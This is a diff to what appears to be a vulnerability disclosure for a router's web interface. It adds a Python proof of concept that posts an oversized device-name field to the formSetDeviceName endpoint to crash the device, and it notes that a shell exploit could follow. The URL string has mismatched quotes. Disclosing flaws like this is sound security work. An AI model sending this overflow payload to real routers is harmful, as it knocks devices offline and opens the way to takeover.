@@ -13,3 +13,20 @@ This vulnerability can be exploited remotely by an unauthenticated attacker, pot
 
    
    ![My Image](7.png)
+
+## 3 POC
+```python
+import requests
+
+url = 'http://IP:port/goform/formSetDeviceName"
+
+headers = {"Cookie": "password=You cookie"}
+
+data = {
+    'serverEn': 2,
+    'devName': 'l' * 10000
+}
+res = requests.post(url=url, headers=headers, data=data)
+print(res.text)
+```
+You can observe the router crashing, and ultimately, it is possible to craft an exploit to gain a shell.
